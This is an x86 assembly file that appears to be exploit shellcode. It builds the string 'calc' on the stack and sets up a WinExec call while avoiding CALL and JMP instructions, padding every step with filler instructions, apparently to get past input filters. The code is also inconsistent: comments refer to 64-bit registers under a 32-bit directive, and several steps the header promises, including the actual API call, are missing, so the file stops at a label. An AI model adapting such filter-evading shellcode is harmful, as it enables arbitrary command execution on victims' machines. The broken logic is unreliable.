    bits 32
    
    %ifndef BIN
      global calc
    %endif
    
    ; <prolog code>
    ; <load address of code after call to LoadLibrary or WinExec>
    ; <load address of string passed to API>
    ; <load address of API>
    ; <Setup homespace and call API>
    ; <Remove homespace>
    ; <epilog code>
    ; push_reg macro
    ; pop_reg macro
    ; set_reg macro
    ;
calc:
    ; ************************* prolog
    mov    al, 0
    enter  256, 0
    
    ; save ebp
    push   ebp
    add    [ebp], al
    
    ; create local variable for rbp
    push   0
    push   esp
    add    [ebp], al
    
    pop    ebp
    add    [ebp], cl
    
    ; save edi
    push   edi      ;    +
    add    [ebp], cl
    
    ; save esi
    push   esi     ;     -
    add    [ebp], cl
    
    ; save ebx
    push   ebx
    add    [ebp], cl
    
    ; ********************** load address to return to after WinExec/LoadLibraryW
    ; remember, we can't use a CALL or JMP, just RET
    
    ; load address of ret_addr onto the stack
    mov    eax, 0xFF004d00
    add    cl, ah
    add    [ebp], cl
    
    mov    eax, 0xFF000100
    add    ch, ah
    add    [ebp], cl
    
    push   ecx
    add    [ebp], cl
    
    pop    ebx
    add    [ebp], cl
    
    ; ********************* load a string onto the stack
    ; instead of loading a string, load an address of the buffer that contains command to execute
    ; write \x63 \x61 \x6c \x63 \x00 or "calc\0" to local buffer
    push   0
    push   esp
    add    [ebp], cl
    
    pop    edi
    add    [ebp], cl

    push   edi
    add    [ebp], cl

    pop    ecx
    add    [ebp], cl
    
    ; store 'calc'
    push   0
    push   esp
    add    [ebp], cl
    
    pop    eax
    add    [ebp], cl
    
    mov    dword[eax], ((0x00 << 24) | ('l' << 16) | (0x00 << 8) | 'c')
    pop    eax
    add    [ebp], cl
    
    xor    eax, (('c' << 24) | (0x00 << 16) | ('a' << 8) | 0x00)
    add    [ebp], cl
    
    stosd
    add    [ebp], cl
    
    ; ********************** for WinExec, set the parameters
    ; set rdx = SW_SHOW (5)
    push   0
    push   esp
    add    [ebp], cl
    
    pop    eax
    add    [ebp], cl
    
    mov    byte[eax], 5
    add    [ebp], cl
    
    pop    edx
    add    [ebp], cl
    
    push   ebx
    add    [ebp], cl
    
    ; *********************** setup homespace
    push   0
    push   0
    push   0
    push   0
    push   0
    
    ; save return address (obsolete)
    push   ebx
    add    [ebp], cl
    
    ; padding shouldn't be required
    ; pad out so the size is no less than 260 bytes
    nop
    add    [ebp], cl
    
    nop
    add    [ebp], cl
    
    nop
    add    [ebp], cl
    
    nop
    add    [ebp], cl
ret_addr: